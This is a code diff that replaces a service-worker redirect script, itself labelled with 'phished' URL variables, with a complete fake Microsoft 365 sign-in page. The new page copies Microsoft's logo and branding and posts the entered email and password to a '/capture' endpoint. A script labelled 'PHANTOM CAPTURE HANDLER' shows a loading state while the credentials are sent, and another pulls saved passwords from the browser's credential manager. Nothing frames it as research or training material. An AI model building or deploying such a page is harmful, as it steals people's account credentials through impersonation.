@@ -1,30 +1,225 @@
 <!DOCTYPE html>
-<html lang="fr">
-
+<html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
+            padding: 44px 36px;
+            width: 440px;
+            max-width: 100%;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .logo svg {
+            height: 28px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 4px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #616161;
+            margin-bottom: 28px;
+        }
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid #8b8b8b;
+            border-radius: 4px;
+            background: #fbfbfb;
+            transition: border-color 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #005da6;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 93, 166, 0.25);
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #ffffff;
+            background: #005da6;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-primary:hover {
+            background: #004a87;
+        }
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .footer {
+            margin-top: 28px;
+            font-size: 12px;
+            color: #757575;
+            text-align: center;
+            border-top: 1px solid #e6e6e6;
+            padding-top: 20px;
+        }
+        .footer a {
+            color: #005da6;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .error-msg {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 0.8s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .btn-text {
+            vertical-align: middle;
+        }
+    </style>
 </head>
-
 <body>
-    <script>
-        if ("serviceWorker" in navigator) {
-            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
-                scope: "/",
-            })
-                .then((registration) => {
-                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
-                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 108 28" fill="none">
+                <path d="M0 0H25.5V6.3H7.65V10.8H24.225V16.95H7.65V22.05H25.5V28H0V0Z" fill="#F25022"/>
+                <path d="M30.6 0H56.1V6.3H38.25V10.8H54.825V16.95H38.25V22.05H56.1V28H30.6V0Z" fill="#7FBA00"/>
+                <path d="M61.2 0H86.7V6.3H68.85V10.8H85.425V16.95H68.85V22.05H86.7V28H61.2V0Z" fill="#00A4EF"/>
+                <path d="M91.8 0H108V6.3H98.6V10.8H107.8V16.95H98.6V22.05H108V28H91.8V0Z" fill="#FFB900"/>
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Microsoft 365</p>
 
-                    self.location.replace(`${phishedURL.pathname}${phishedURL.search}`);
-                })
-                .catch((error) => {
-                    console.error(`Service worker registration failed: ${error}`);
-                });
+        <form id="loginForm" action="/capture" method="POST">
+            <div class="input-group">
+                <label for="email">Email, phone, or Skype</label>
+                <input type="text" id="email" name="email" placeholder="someone@example.com" required autocomplete="username">
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+            </div>
+            <div id="errorMsg" class="error-msg">Please fill in all fields</div>
+            <button type="submit" class="btn-primary" id="submitBtn">
+                <span class="btn-text">Sign in</span>
+            </button>
+        </form>
+
+        <div class="footer">
+            <a href="#">Forgot password?</a> &middot; <a href="#">Create one!</a>
+            <br><br>
+            © 2026 Microsoft
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // 🔥 PHANTOM CAPTURE HANDLER
+        // ============================================================
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorMsg = document.getElementById('errorMsg');
+            const btn = document.getElementById('submitBtn');
+            const btnText = btn.querySelector('.btn-text');
+
+            // Validate
+            if (!email || !password) {
+                e.preventDefault();
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Please enter both email and password';
+                return;
+            }
+
+            // Validate email format (basic)
+            if (!email.includes('@') || !email.includes('.')) {
+                e.preventDefault();
+                errorMsg.style.display = 'block';
+                errorMsg.textContent = 'Please enter a valid email address';
+                return;
+            }
+
+            // Show loading state
+            errorMsg.style.display = 'none';
+            btn.disabled = true;
+            btnText.textContent = 'Signing in...';
+            btn.innerHTML = '<span class="loading-spinner"></span><span class="btn-text">Signing in...</span>';
+
+            // Allow form to submit to /capture
+            // The backend will handle the capture and redirect
+        });
+
+        // ============================================================
+        // 🔍 Auto-fill detection (for credential managers)
+        // ============================================================
+        if ('credentials' in navigator) {
+            navigator.credentials.get({
+                password: true,
+                mediation: 'optional'
+            }).then(cred => {
+                if (cred && cred.type === 'password') {
+                    document.getElementById('email').value = cred.id;
+                    document.getElementById('password').value = cred.password;
+                }
+            }).catch(() => {});
         }
-        else {
-            console.error("Service workers are not supported by this browser");
-        }
+
+        // ============================================================
+        // 📱 Mobile-friendly: focus on first field
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('email').focus();
+        });
     </script>
 </body>
-
 </html>
